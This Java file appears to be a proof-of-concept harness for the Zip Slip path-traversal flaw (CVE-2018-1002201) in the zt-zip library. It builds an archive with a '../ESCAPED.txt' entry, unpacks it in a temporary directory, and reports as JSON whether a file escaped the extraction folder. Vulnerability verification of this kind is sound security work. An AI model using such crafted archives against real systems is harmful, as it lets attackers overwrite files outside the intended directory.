import org.zeroturnaround.zip.*;
import java.io.*;
import java.util.zip.*;

/**
 * Witness for CVE-2018-1002201 (Zip Slip, CWE-22) in zt-zip.
 * Source: the name of a ZIP entry (attacker controls the archive).
 * Sink:   new File(outputDir, name) -> file written below outputDir (ZipUtil$Unpacker.process).
 * We build a harmless archive whose single entry name traverses up out of the
 * extraction directory, call the public ZipUtil.unpack(File,File) API, and check
 * whether a file was created OUTSIDE the extraction directory.
 */
public class ZtZipWitness {
  public static void main(String[] a) throws Exception {
    File base = File.createTempFile("zipslip", "d"); base.delete(); base.mkdirs();
    File outDir = new File(base, "extract"); outDir.mkdirs();
    File target = new File(base, "ESCAPED.txt");        // sibling of outDir, i.e. outside it
    if (target.exists()) target.delete();
    String entryName = "../ESCAPED.txt";                // the malicious entry name (the source)
    File zip = new File(base, "evil.zip");
    try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip))) {
      zos.putNextEntry(new ZipEntry(entryName));
      zos.write("owned".getBytes("UTF-8"));
      zos.closeEntry();
    }
    String err = "";
    try {
      ZipUtil.unpack(zip, outDir);                      // the vulnerable operation
    } catch (Throwable t) {
      err = t.getClass().getName() + ": " + String.valueOf(t.getMessage());
    }
    boolean escaped = target.exists();                  // the security effect: file written outside outDir
    String payloadFromOutside = escaped ? readFile(target) : "";
    boolean witnessed = escaped && "owned".equals(payloadFromOutside);
    System.out.println("{"
      + "\"subject\":\"zt-zip\",\"cve\":\"CVE-2018-1002201\",\"cwe\":\"CWE-22\","
      + "\"source\":\"ZipEntry.getName() = '" + entryName + "'\","
      + "\"sink\":\"new File(outputDir, name) in ZipUtil$Unpacker.process\","
      + "\"witnessed\":" + witnessed + ","
      + "\"evidence\":\"file written outside extraction dir=" + escaped + ", content='" + payloadFromOutside + "'\","
      + "\"blocked_error\":\"" + esc(err) + "\"}");
  }
  static String readFile(File f) throws Exception {
    try (BufferedReader r = new BufferedReader(new FileReader(f))) { return r.readLine(); }
  }
  static String esc(String s){ return s.replace("\\","\\\\").replace("\"","\\\""); }
}
